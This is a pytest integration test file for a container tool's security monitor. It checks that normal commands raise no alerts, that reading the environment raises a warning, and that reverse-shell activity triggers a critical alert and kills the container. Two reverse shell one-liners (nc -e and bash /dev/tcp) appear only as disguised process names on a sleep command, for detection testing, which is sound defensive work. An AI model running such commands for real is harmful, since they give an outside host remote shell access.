#!/usr/bin/env python3
"""
Integration tests for security monitoring - Real usage testing.

Tests monitoring during actual coi shell sessions.
Reflects real user workflow: start monitored shell, execute commands, verify detection.
"""

import json
import subprocess
import time
from pathlib import Path

import pytest


@pytest.fixture
def test_workspace(tmp_path):
    """Create a temporary workspace for testing."""
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    (workspace / "test.txt").write_text("test content")
    return str(workspace)


@pytest.fixture
def enable_monitoring():
    """Enable monitoring via config for all tests."""
    config_path = Path.home() / ".config" / "coi" / "config.toml"
    config_backup = None

    if config_path.exists():
        config_backup = config_path.read_text()

    config_path.parent.mkdir(parents=True, exist_ok=True)
    config_path.write_text(
        """
[monitoring]
enabled = true
auto_pause_on_high = true
auto_kill_on_critical = true
poll_interval_sec = 1
"""
    )

    yield config_path

    if config_backup:
        config_path.write_text(config_backup)
    elif config_path.exists():
        config_path.unlink()


def extract_container_name(stderr_text):
    """Extract container name from coi shell stderr output."""
    for line in stderr_text.split("\n"):
        if "Container:" in line:
            return line.split("Container:")[1].strip().split()[0]
    return None


def get_container_state(container_name):
    """Get current container state."""
    result = subprocess.run(
        ["incus", "list", container_name, "--format=json"],
        capture_output=True,
        text=True,
        timeout=10,
    )
    if result.returncode != 0:
        return "Unknown"

    containers = json.loads(result.stdout)
    return containers[0].get("status", "Unknown") if containers else "Unknown"


def wait_for_container_stopped(container_name, timeout=20):
    """Wait for container to be stopped/frozen."""
    start = time.time()
    while time.time() - start < timeout:
        state = get_container_state(container_name)
        if state in ["Stopped", "Frozen"]:
            return True
        time.sleep(1)
    return False


def get_threat_events(container_name):
    """Get threat events from audit log (entries with 'level' field)."""
    audit_log = Path.home() / ".coi" / "audit" / f"{container_name}.jsonl"
    if not audit_log.exists():
        return []

    events = []
    with open(audit_log) as f:
        for line in f:
            if line.strip():
                try:
                    event = json.loads(line)
                    if "level" in event:  # ThreatEvent, not MonitorSnapshot
                        events.append(event)
                except json.JSONDecodeError:
                    pass
    return events


def cleanup_container(container_name, coi_binary):
    """Force cleanup a container."""
    subprocess.run(
        [coi_binary, "container", "delete", container_name, "--force"],
        timeout=30,
        check=False,
    )


class TestBasicMonitoring:
    """Test basic monitoring functionality."""

    def test_shell_starts_with_monitoring(
        self, test_workspace, enable_monitoring, coi_binary
    ):
        """Verify coi shell starts successfully with monitoring enabled."""
        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", test_workspace, "--debug"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )

        time.sleep(5)
        assert proc.poll() is None, "Shell should be running"

        # Clean exit
        proc.stdin.write("exit\n")
        proc.stdin.flush()
        proc.wait(timeout=15)

    def test_normal_commands_no_threats(
        self, test_workspace, enable_monitoring, coi_binary
    ):
        """Verify normal commands don't trigger false alerts."""
        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", test_workspace, "--debug"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )

        time.sleep(5)

        # Extract container name
        stderr_chunk = proc.stderr.read(2000)
        container_name = extract_container_name(stderr_chunk)
        assert container_name, "Could not extract container name"

        # Run safe commands
        proc.stdin.write("echo hello\n")
        proc.stdin.write("ls /workspace\n")
        proc.stdin.flush()

        time.sleep(3)

        # Exit
        proc.stdin.write("exit\n")
        proc.stdin.flush()
        proc.wait(timeout=15)

        # Should have no threat events
        events = get_threat_events(container_name)
        assert len(events) == 0, f"Expected no threats, got {len(events)}"

        cleanup_container(container_name, coi_binary)


class TestThreatDetection:
    """Test detection of various threat types."""

    def test_reverse_shell_detected(
        self, test_workspace, enable_monitoring, coi_binary
    ):
        """Verify reverse shell attempts are detected as CRITICAL."""
        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", test_workspace, "--debug"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )

        time.sleep(5)

        stderr_chunk = proc.stderr.read(2000)
        container_name = extract_container_name(stderr_chunk)
        assert container_name, "Could not extract container name"

        # Simulate reverse shell in background (using exec -a trick)
        # This keeps a process running that looks like a reverse shell
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "sh",
                "-c",
                "exec -a 'nc -e /bin/bash 192.168.1.1 4444' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for monitoring to detect and respond
        time.sleep(8)

        # Verify container was killed (critical threat response)
        stopped = wait_for_container_stopped(container_name, timeout=10)
        assert stopped, f"Container should be stopped, state: {get_container_state(container_name)}"

        # Verify threat event logged
        events = get_threat_events(container_name)
        critical = [e for e in events if e.get("level") == "critical"]
        assert len(critical) > 0, "Expected CRITICAL reverse shell event"

        # Shell process should have exited
        proc.wait(timeout=5)

        cleanup_container(container_name, coi_binary)

    def test_env_scanning_warning(self, test_workspace, enable_monitoring, coi_binary):
        """Verify environment variable scanning triggers WARNING."""
        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", test_workspace, "--debug"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )

        time.sleep(5)

        stderr_chunk = proc.stderr.read(2000)
        container_name = extract_container_name(stderr_chunk)
        assert container_name, "Could not extract container name"

        # Run env command in background (keep it alive for detection)
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "sh",
                "-c",
                "exec -a 'env' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for monitoring
        time.sleep(5)

        # Container should still be running (WARNING doesn't kill)
        state = get_container_state(container_name)
        assert state == "Running", f"Container should still run on WARNING, got {state}"

        # Verify WARNING event
        events = get_threat_events(container_name)
        warnings = [e for e in events if e.get("level") == "warning"]
        assert len(warnings) > 0, "Expected WARNING for env scanning"

        # Exit
        proc.stdin.write("exit\n")
        proc.stdin.flush()
        proc.wait(timeout=15)

        cleanup_container(container_name, coi_binary)


class TestAutomatedResponse:
    """Test automated threat response system."""

    def test_auto_kill_on_critical(self, test_workspace, enable_monitoring, coi_binary):
        """Verify auto-kill executes on CRITICAL threats."""
        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", test_workspace, "--debug"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )

        time.sleep(5)

        stderr_chunk = proc.stderr.read(2000)
        container_name = extract_container_name(stderr_chunk)
        assert container_name, "Could not extract container name"

        # Trigger CRITICAL threat
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "sh",
                "-c",
                "exec -a 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for auto-kill
        stopped = wait_for_container_stopped(container_name, timeout=15)
        assert stopped, "Container should be auto-killed on CRITICAL threat"

        # Verify event shows "killed" action
        events = get_threat_events(container_name)
        killed = [e for e in events if e.get("action") == "killed"]
        assert len(killed) > 0, "Expected event with action='killed'"

        proc.wait(timeout=5)
        cleanup_container(container_name, coi_binary)


# Tests are focused on real usage patterns:
# 1. Start coi shell (with monitoring)
# 2. Execute commands (normal or malicious)
# 3. Verify detection and response
# 4. Check audit logs
# 5. Cleanup

# This matches exactly how users will use the feature in production.
